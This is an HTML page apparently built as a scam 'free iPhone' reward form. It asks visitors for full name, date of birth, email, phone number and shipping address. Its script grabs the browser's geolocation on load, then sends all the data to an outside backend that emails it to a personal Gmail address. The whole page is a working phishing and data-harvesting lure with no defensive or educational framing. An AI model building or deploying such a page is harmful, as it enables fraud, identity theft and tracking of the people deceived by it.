<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Reward Form</title>
    <!-- Bootstrap CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f8ff;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 600px;
            background: #ffffff;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .form-heading {
            color: #333;
            font-size: 1.8rem;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .lead {
            color: #555;
            font-size: 1rem;
            margin-bottom: 20px;
        }
        .form-control {
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 10px;
            font-size: 1rem;
            margin-bottom: 10px;
        }
        .btn-primary {
            background-color: #007bff;
            border: none;
            border-radius: 8px;
            padding: 10px 20px;
            font-size: 1rem;
        }
        #locationDisplay {
            background: #e9ecef;
            color: #666;
            padding: 0.5rem;
            border-radius: 4px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="form-heading">Congratulations! ðŸŽ‰</h1>
        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
        <p class="form-text">Please fill out the form below to claim your reward.</p>

        <!-- Fill Out Form -->
        <form id="rewardForm">
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
            </div>
            <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" class="form-control" id="dob" required>
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="phoneNumber">Phone Number</label>
                <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
            </div>
            <div class="form-group">
                <label for="address">Shipping Address</label>
                <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
            </div>
            <div class="form-group">
                <label for="city">City</label>
                <input type="text" class="form-control" id="city" placeholder="Enter your city" required>
            </div>
            <div class="form-group">
                <label for="postalCode">Postal Code</label>
                <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
            </div>

            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
        </form>
    </div>

    <!-- JavaScript code -->
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const locationDisplay = document.getElementById("locationDisplay");
            let latitude = null;
            let longitude = null;

            // Get user's location
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;
                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                    },
                    (error) => {
                        locationDisplay.textContent = "Error retrieving location.";
                        console.error(error);
                    }
                );
            } else {
                locationDisplay.textContent = "Geolocation is not supported by this browser.";
            }

            // Handle form submission
            document.getElementById("rewardForm").addEventListener("submit", function (e) {
                e.preventDefault();

                const fullName = document.getElementById("fullName").value;
                const dob = document.getElementById("dob").value;
                const email = document.getElementById("email").value;
                const phoneNumber = document.getElementById("phoneNumber").value;
                const address = document.getElementById("address").value;
                const city = document.getElementById("city").value;
                const postalCode = document.getElementById("postalCode").value;

                // If location is available, add it to the message
                const locationMessage = latitude && longitude ? `Latitude: ${latitude}\nLongitude: ${longitude}` : "Location not available";

                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}\n${locationMessage}`;

                sendEmail("New iPhone Claim Form Submission", formMessage, "Khalilrodeni@gmail.com");

                alert("Thank you for your submission! We will contact you shortly.");
            });

            function sendEmail(subject, message, recipientEmail) {
                const emailData = {
                    subject: subject,
                    message: message,
                    recipient_email: recipientEmail,
                    recipient_name: "Khalil Ahmed"
                };

                fetch("https://zalex-backend.onrender.com/api/send-email/", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(emailData)
                })
                .then(response => {
                    if (response.ok) {
                        return response.json();
                    } else {
                        throw new Error(`Server responded with ${response.status}`);
                    }
                })
                .then(data => {
                    console.log("Email sent successfully:", data);
                })
                .catch(error => {
                    console.error("Error sending email:", error);
                });
            }
        });
    </script>
</body>
</html>
